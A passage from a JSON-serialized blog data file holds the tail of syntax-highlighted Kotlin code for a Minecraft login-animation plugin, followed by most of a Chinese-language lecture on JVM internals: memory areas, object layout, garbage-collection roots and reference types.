function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"RIGHT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>RIGHT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"LEFT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>LEFT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerSwapHandItemsEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"F\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>功能</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 展示登录动画</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">toIconDisplayAnimation</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    player<span class=\"token punctuation\">.</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FixedMetadataValue</span><span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> future <span class=\"token operator\">=</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> time <span class=\"token operator\">=</span> conf<span class=\"token punctuation\">.</span><span class=\"token function\">getLong</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.time\"</span><span class=\"token punctuation\">)</span>\n    KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        sender <span class=\"token operator\">=</span> player\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// 方法</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        player<span class=\"token punctuation\">.</span><span class=\"token function\">removeMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n        KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.after-display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            sender <span class=\"token operator\">=</span> player\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    future<span class=\"token punctuation\">.</span><span class=\"token function\">thenRun</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">val</span> listener <span class=\"token operator\">=</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">.</span>uniqueId<span class=\"token punctuation\">,</span> future<span class=\"token punctuation\">)</span>\n    Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getPluginManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">registerEvents</span><span class=\"token punctuation\">(</span>listener<span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n    Tasks<span class=\"token punctuation\">.</span><span class=\"token function\">task</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>time <span class=\"token operator\">*</span> <span class=\"token number\">50L</span><span class=\"token punctuation\">,</span> TimeUnit<span class=\"token punctuation\">.</span>MILLISECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>ignored<span class=\"token operator\">:</span> TimeoutException<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// 这里貌似future已经被中断了，因为超时了，所以future即使complete也不会执行他的回调函数</span>\n            <span class=\"token comment\">// future.complete(true)</span>\n            <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"浅入浅出JVM","date":"2022-07-30T16:00:00.000Z","author":"寒雨","hide":false,"summary":"红岩讲课的课件","_content":"\n# 浅入浅出JVM & Hook\n\n> 其中混杂有相当多的个人理解，如有谬误烦请学长指正\n\n## 什么是JVM\n\n**Java Virtual Machine**，即Java虚拟机。那么虚拟机又是什么？\n\n> 虚拟机（Virtual Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。\n\n但不同于其他虚拟机的是，JVM模拟的是一个无法直接在硬件设备上安装的计算机系统——究其根本，它就是一个在各个系统中具有基本相同行为的**跨平台程序**，它提供了一系列可供Java语言调用的API，而这些API都可以溯源到**本地方法**(也就是native修饰的方法)。这些方法在native语言层面实现，且在不同的系统上有着不同逻辑的实现。但抽象到java语言层面，它们的作用是一致的。\n\n就这样，JVM为我们在各个系统提供了一个具有统一“系统“的虚拟机环境，我们不需要让外部的实际系统认识我们的编译出来的软件，我们只需要让JVM认识它就可以了。每当我们使用`java -jar`命令运行一个jar文件, 实际上都先运行了JVM，再由JVM来**运行时**的解释并加载jar包中的类文件，并通过META-INF中的主类信息找到主类并执行其中的main方法。\n\n因此，我们使用Java等依赖于JVM的语言编写程序时如果只调用Java语言为我们提供的API，我们编写的代码就可以在一切支持JVM的系统上运行。正所谓 ***Write once, run anywhere***。你会发现很多直接编译为native的语言(C, C++, Rust, Go...)甚至需要在对应的系统编译才能运行，这也正是JVM系语言相对于其他语言的优势之一。\n\n## JVM的种类\n\n这里介绍主要的几种\n\n### Sun Classic VM\n\n> 万物伊始\n\n其中使用的技术在今天看来已经相当原始，这款虚拟机的使命也早已终结，但凭它”世界上第一款商用Java虚拟机“的头衔，便足以让它被历史铭记。\n\n### HotSpot VM\n\n> 武林盟主\n\n毫无疑问是当今被最广泛使用的Java虚拟机\n\n### Graal VM\n\n> 明日之星\n\n创造性的将字节码编译为另一种中间媒介，同时支持将其他语言编译为这种中间媒介，实现多语言之间的相互调用，JVM将不再专属于字节码。举个例子，我们甚至可以在Java中使用Node.js的Express框架来开发后端程序。\n\n### Dalvik VM\n\n> 为Android而生\n\n> Dalvik是[Google](https://baike.baidu.com/item/Google/86964)公司自己设计用于Android平台的[虚拟机](https://baike.baidu.com/item/虚拟机/104440)。Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一。它可以支持已转换为 .dex（即Dalvik Executable）格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种[压缩格式](https://baike.baidu.com/item/压缩格式/2844535)，适合内存和处理器速度有限的系统。Dalvik 经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行。独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭。\n>\n> 很长时间以来，Dalvik虚拟机一直被用户指责为拖慢安卓系统运行速度不如IOS的根源。\n>\n> 2014年6月25日，Android L 正式亮相于召开的谷歌I/O大会，Android L 改动幅度较大，[谷歌](https://baike.baidu.com/item/谷歌/117920)将直接删除Dalvik，代替它的是传闻已久的ART。\n\n### ART\n\n> ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。\n\n**Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。**\n\n> Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，即使采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。 安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）\n\nART优点:\n\n- 系统性能显著提升\n- 应用启动更快、运行更快、体验更流畅、触感反馈更及时\n- 续航能力提升\n- 支持更低的硬件\n\nART缺点:\n\n- 更大的存储空间占用，可能增加10%-20%\n- 更长的应用安装时间\n\n> 应廖老师的要求，讲讲ART的GC\n\n// TODO 内容好多，我太难了\n\n## 自行编译JDK8\n\n非常麻烦，看看有没有时间去做。自行编译jvm可以对jvm打断点，还是很有帮助的。\n\n// TODO\n\n## 内存管理\n\n对于从事C，C++程序开发的开发人员，在内存管理领域，他们需要手动分配/释放内存。虽然这是一件繁琐的工作，但这也使C++等一系列需要手动管理内存的语言能做到更多的事情。例如MMKV，它的底层原理使用C++实现——手动管理了一块堆外内存。(但其实Java也并非做不到这个，Unsafe类中提供了手动分配/释放堆外内存的方法，并且提供了跟C++一样的面向指针的操作方法。)\n\n得益于JVM强大的内存管理机制，JVM语言程序员不需要手动为每个对象分配/释放堆内存，一切看起来相当美好。但正是因为我们将内存管理的程序交给了JVM，一旦出现内存泄漏的问题，如果不清楚JVM内存管理机制的原理就很难解决问题。\n\n### 运行时数据区\n\nJava虚拟机在执行Java程序的过程中会把它管理的内存划分为若干个不同的数据区域:\n\n![Java虚拟机运行时数据区](http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png)\n\n#### 程序计数器\n\n程序计数器占用了比较小的一块内存空间，可以看作是**当前线程**所执行字节码的行号(字节码的行号，不是代码的行号，字节码应该包含有对应代码行数的信息)指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令, 它是**程序控制流**的指示器，流程控制，异常处理，线程恢复都需要依赖它来实现。\n\nJava虚拟机的多线程是通过**线程轮流切换，分配处理器时间**实现的，因此在任何一个确定的时刻，一个内核都只会执行一条线程中的指令（即并发执行)。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个程序计数器。因此程序计数器是**线程私有**的。\n\n**---这里稍微讲讲Java的线程调度 & 协程---**\n\n这里引用一段别人的话，上面我可能表述得不是很准确\n\n> 因为Java的多线程也是依靠时间片轮转算法进行的，因此一个CPU同一时间也只会处理一个线程，当某个线程的时间片消耗完成后，会自动切换到下一个线程继续执行，而当前线程的执行位置会被保存到当前线程的程序计数器中，当下次轮转到此线程时，又继续根据之前的执行位置继续向下执行。\n\n> **单核**的CPU是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。同时间段内有多个线程需要CPU去运行时，CPU也只能交替去执行多个线程中的一个线程，但是由于其执行速度特别快，因此感觉不出来。\n\n按照上面的说法，我们发现，其实线程可以看作一个任务，**内核一直在很多线程之间反复横跳**: 这个做一会儿就停下来，去做下一个。\n\n但这里就会出现一个问题，使用`Thread.sleep(long)`停下的线程，内核会怎么办？答案是仍然会到他身上去，但什么也不做，就白白浪费了给cpu分配的时间分片。这就是这种设计的局限性，且不说创建一个新的线程相当占内存，即便是内存足够，并发效率也相当差（其实跟Java当时刚出的时候的其他语言比起来已经很不错了）。线程池当然也会有这个问题。\n\n那么理想的状态是什么呢？我让这个线程休眠了，你cpu就不要管他，把时间分给其他有任务的线程。\n\n两条路，要么你从内核层面去改良，去教cpu做事。对应了`Thread#yield()`,让当前线程把自己的时间让给其他线程，实现**抢占式调度**。\n\n另外一条道路就是协程，从用户层面改良，cpu教我做事。\n\n> 如果你觉得Thread#sleep会浪费并发效率，那你就不要用！你要提交能充分利用我效率的任务，而不是一味的谩骂和指责。\n>\n> ​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t—— CPU\n\n既然`Thread.sleep()`会导致并发效率低下，那我就不用！在线程下面再区分出来一个协程的概念，在这里把无用的任务过滤一遍，再交给线程。这样每个内核对每个线程的利用率就提高了，也可以提高并发效率。\n\n是不是感觉java的线程也挺像协程的:)，之前蔷神讲协程也说过线程也可以看成协程的一种实现。我个人觉得他们唯一不同的地方就在于线程是由内核来调度，处于**内核态**，协程由用户编写的逻辑进行调度，处于**用户态**。协程其实是减少了内核的**无用的**工作量，所以并发吞吐量更大。\n\n![](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/飞书20220708-161709.jpg)\n\n**---私货结束---**\n\n程序计数器是JVM唯一一个不会产生OOM的内存区域。\n\n> 在执行Java方法时，程序计数器的值为正在执行的虚拟机字节码指令的地址\n>\n> 在执行本地方法时，程序计数器的值为空(undefined)\n\n#### 虚拟机栈\n\n其实大家应该都知道所谓堆和栈的概念吧。即便Jvm的堆和栈你没有了解过，在C/C++课上应该也了解过堆栈的概念吧？虽然C++这种直接编译到native的语言中的堆和栈与Jvm语言中的堆和栈并不是一个东西——JVM是virtual machine，是虚拟机，它的一切特性都是软件模拟的。C++中我们执行程序直接使用硬件的堆栈，而Java我们执行程序使用JVM为我们模拟出来的堆栈。\n\n与程序计数器一样，虚拟机栈也是线程私有的, 它的生命周期与线程相同，随线程的释放而释放。每当一个方法被调用，虚拟机都会同步创建一个栈帧用于存储**局部变量表，操作数栈，动态连接，方法出口**等信息。每一个方法从调用到返回的过程就对应着一个栈帧入栈到出栈的过程。\n\n这里从别人那里抄来了一个流程图解\n\n>可能听起来有点懵逼，这里我们来模拟一下整个虚拟机栈的运作流程，先编写一个测试类：\n>\n>```java\n>public class Main {\n>    public static void main(String[] args) {\n>        int res = a();\n>        System.out.println(res);\n>    }\n>\n>    public static int a(){\n>        return b();\n>    }\n>\n>    public static int b(){\n>        return c();\n>    }\n>\n>    public static int c(){\n>        int a = 10;\n>        int b = 20;\n>        return a + b;\n>    }\n>}\n>```\n>\n>当我们的主方法执行后，会依次执行三个方法`a() -> b() -> c() -> 返回`\n>\n>可以看到在编译之后，我们整个方法的最大操作数栈深度、局部变量表都是已经确定好的，当我们程序开始执行时，会根据这些信息封装为对应的栈帧，我们从`main`方法开始看起：\n>\n>![image-20220131142625842](https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg)\n>\n>接着我们继续往下，调用方法`a()`，这时当前方法就不会继续向下运行了，而是去执行方法`a()`，那么同样的，将此方法也入栈，注意是放入到栈顶位置，`main`方法的栈帧会被压下去：\n>\n>![image-20220131143641690](https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg)\n>\n>这时，进入方法a之后，又继而进入到方法b，最后在进入c，因此，到达方法c的时候，我们的虚拟机栈变成了：\n>\n>![image-20220131144209743](https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg)\n>\n>现在我们依次执行方法c中的指令，最后返回a+b的结果，在方法c返回之后，也就代表方法c已经执行结束了，栈帧4会自动出栈，这时栈帧3就得到了上一栈帧返回的结果，并继续执行，但是由于紧接着马上就返回，所以继续重复栈帧4的操作，此时栈帧3也出栈并继续将结果交给下一个栈帧2，最后栈帧2再将结果返回给栈帧1，然后栈帧1就可以继续向下运行了，最后输出结果。\n>\n>![image-20220131144955668](https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg)\n\n虚拟机栈并不是无限大的，如果其中堆积的栈帧数量太多就会**爆栈**(StackOverFlowException)，我们可以通过`-Xss size`的vm options设置虚拟机的栈大小。\n\n常见关于虚拟机栈的问题:\n\n垃圾回收是否涉及栈内存？\n\n- **不涉及**，垃圾回收只涉及堆内存。在方法返回后其对应的栈帧就会出栈，所以不需要回收内存。\n\n栈内存分配得越大越好吗?\n\n- **不**，栈内存大了，其他的内存区域就小了。有时你对递归调用并没有这么大的需求，毕竟所有的递归调用都可以通过循环实现。\n\n#### 本地方法栈\n\n本地方法栈其实跟虚拟机栈的作用非常相似，只是他们一个为字节码层面的方法服务，一个为本地方法服务。\n\n#### Java堆\n\nJava堆是虚拟机管理的内存中最大的一块, 用来存放对象实例。也是GC的主战场。不同于以上几个区域，Java堆是线程间共享的。所以在访问堆中存储的数据需要注意线程安全问题。\n\n#### 方法区\n\n与Java堆一样是线程间共享的区域，它主要用于存储已经被虚拟机加载的**类型信息，常量，静态变量，即时编译器编译后的代码缓存**。虽然《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，但它却有一个别名叫做“非堆”(Non-Heap)，目的是与Java堆区分开来。\n\n你可能会听说方法区就是堆的永久代这个说法，实际不是这样的。仅仅只是因为HotSpot VM选择使用永久代来实现方法区，但实际上这是两个完全不同的概念。\n\n> 可能看起来有点突兀，只是写到这里的时候突然想说一下JIT（即时编译器）的工作流程\n>\n> 这里可以发现其实jvm并非单纯解释执行字节码，而是在解释量达到一定阈值后触发即时编译，将编译后的字节码缓存到方法区，下次调用时便可以直接执行编译后的机器码。（也就是说常用的方法会被缓存为机器码）\n>\n> ![img](https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg)\n\n**运行时常量池**\n\n运行时常量池是方法区的一部分。在类加载时JVM读取class文件中常量池表的信息，并把它存入运行时常量池。至于常量池表，下面我们讲字节码的时候再详细介绍，现在我们只需要知道它是存放程序运行所需的常量即可。\n\n而运行时常量池的另外一个重要特征就是具备**动态性**，Java并不要求常量一定只有在编译期才能产生，这点与c++不同，运行期间也可以有新的常量进入常量池。这种特性被开发人员利用得比较多的就是`String#intern()`方法。\n\n> 关于String#intern方法，直接使用双引号声明的字符串都会直接存储在常量池中\n>\n> 而非通过双引号声明出来的字符串可以使用String#intern方法查询常量池中是否存在该字符串，若不存在就会将其放入常量池\n>\n> 是不是又可以理解java的字符串对象为什么不可变了，因为我们一般获取的字符串都会存储在常量池中，如果直接对字符串对象动刀岂不是没有意义了\n>\n> 这也是为什么不推荐直接通过String的构造方法获得一个String对象的原因，因为这样会new出来一个新对象，而非存储在常量池中的字符串\n\n### 对象\n\n#### 创建对象大致流程\n\n##### 类加载检查\n\n当jvm遇到一条字节码new指令的时候，首先将会检查这个指令的参数是否能在常量池定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载，解析和初始化过。如果没有，先执行相应的类加载过程。\n\n##### 分配内存\n\n- 指针碰撞\n\n​\t在Java堆规整的情况下（所有对象的地址连续），为新对象分配内存只需要把指针向空闲区域移动\n\n- 空闲列表\n\n​\t在Java堆内存存放分散的情况下，我们必须维护一个列表，记录哪些内存块是可用的，分配内存时从列表中找到合适的内存块，并更新表上的记录。\n\n**分配内存这个过程需要保证线程安全**，一般采取两种做法: \n\n- 对分配内存空间的动作进行同步处理——实际上虚拟机是采用CAS配上失败重试的方式保证更新操作的原子性\n- 为每条线程预先分配一块堆内存，即本地线程分配缓冲，哪个线程要分配内存，就在哪个线程的本地缓冲区分配。本地缓冲区消耗完了才会锁同步。\n\n##### 初始化内存空间\n\n即为对象的成员变量赋初值，没有赋初值的初始化为类型对应零值（引用类型对应null）\n\n##### 初始化对象头 (Object Header)\n\nJava虚拟机需要对对象进行必要的设置，例如这个对象是哪个类的实例，如何才能找到类的元数据信息，对象的hash code(实际上会延后到调用`Object#hashCode()`才会计算)，对象的GC分代年龄等信息，这些信息会存放在对象的**对象头**中。\n\n##### 调用构造器\n\n使用正常途径新建对象必不可少的环节，当然使用`Unsafe#allocateInstance()`创建对象是可以跳过这一步的。(Gson的反序列化出来的对象就是使用它新建的，所以说它不适合Kt，因为Kt的空安全检查逻辑实际上是写在构造器里的，Gson这样做直接跳过了空安全检查)\n\n#### 对象的内存布局\n\n在HotSpot虚拟机中，对象在堆内存中的储存布局可以划分为三个部分: 对象头(Header)，实例数据(Instance Data)和对齐填充(Padding)。\n\n对象头中包含两类信息: 第一类是用于存储对象自身的运行时数据，如HashCode，GC分代年龄，锁状态标志，线程持有的锁，偏向线程ID，偏向时间戳等，这部分数据的长度在32位和64位的虚拟机中分别为32和64个bit，官方称它为“Mark World”。\n\n实例数据部分是对象真正存储的有效信息，即我们在程序代码中所定义的字段等内容\n\n对齐填充部分只是起到一个占位符的作用，由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说任何对象的大小都必须是8字节的倍数。对象头部分已经被精心设计为8字节的倍数（1倍或2倍）。因此，如果对象实例数据部分没有对齐的话，就需要通过对齐填充来补全。\n\n#### 对象的访问定位\n\n创建对象自然是为了使用对象，我们的java程序一般通过栈上保存的**reference**(即引用)来操作堆上的具体对象。但Java虚拟机规范中只规定了这个reference类型是一个指向对象的引用，并没有强制要求这个引用应该如何定位，访问对象。所以对象访问方式也是由虚拟机实现而定的，主流的访问方式主要有使用**句柄**和**指针**。\n\n##### 句柄\n\n>  如果使用句柄访问的话，Java堆中将可能划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象的实例数据与类型数据各自具体的地址信息\n\n使用句柄来访问的最大好处是reference中存储的是稳定的句柄地址，在对象被移动（GC时移动是很普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。\n\n![飞书20220708-221205](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png)\n\n##### 指针\n\n> 如果直接使用指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型的相关信息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次访问的开销。\n\n直接使用指针访问的好处在与速度快，它节省了一次指针定位的开销，由于对象访问在java中非常频繁，这笔开销相当不容小觑。**HotSpot**虚拟机采用指针访问\n\n![飞书20220708-221128](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png)\n\n### 垃圾回收 (GC)\n\n大家应该都知道这个东西，我就不介绍了，直接切入正题\n\n#### 引用计数算法 & 可达性分析算法\n\n在堆中存放着Java世界中几乎所有的对象实例，垃圾收集器在堆中进行回收前，第一件事就是要确定这些对象之中还有哪些”存活“着，哪些已经“死去”。下面就讲一讲比较常见的两种判断的方法。\n\n##### 引用计数算法\n\n在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就+1，引用失效时，计数器值就-1。任何时候计数器为0的对象是不可能再使用的，可以直接回收。\n\n虽然引用计数法简单高效，在大多数情况下是一个不错的算法。但主流的Java虚拟机并没有采用引用计数法进行内存管理，因为这个算法需要处理大量的意外情况——比如循环引用。\n\n##### 可达性分析算法\n\n当前主流的商用应用语言（Java，C#等）的内存管理子系统都是通过**可达性分析**算法来判定对象是否存活。这个算法的基本思路就是通过一系列称为**GC Roots**的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程中走过路径称为**引用链**，如果某个对象到GC Roots间没有任何引用链相连，则该对象**不可达**，就会被判定为可回收的对象。\n\n可作为GC Roots的对象:\n\n- 在虚拟机栈中引用的对象\n- 方法区中类静态属性引用的对象 （例如Java的引用类型静态变量）\n- 方法区中常量引用的对象 （例如字符串常量池中的引用）\n- 在本地方法栈中JNI引用的对象\n- Java虚拟机内部的引用，如**基本数据类型对应的Class对象**，一些常驻的异常对象（如NullPointerException）等，还有系统类加载器。\n\n![](https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\n#### 引用的类型\n\n实际上GC的回收策略并不死板，在剩余内存较少的时候，GC会尽可能回收多的对象来腾出更多的内存空间。那么我们要如何规定在剩余内存较少的时候才需要回收的那部分对象呢？于是在JDK1.2之后，Java对引用的概念进行了扩充，将引用分为**强引用，软引用，弱引用，虚引用**四种类型。\n\n##### 强引用\n\n最传统的引用定义，指程序代码中普遍存在的引用赋值。只要强引用关系存在，GC就不会回收被引用的对象。\n\n##### 软引用\n\n软引用用来描述一些还需要用到，但非必须的对象，在内存不足时，GC会回收掉只被软引用关联的对象。可以使用`SoftReference`类来实现软引用。\n\n##### 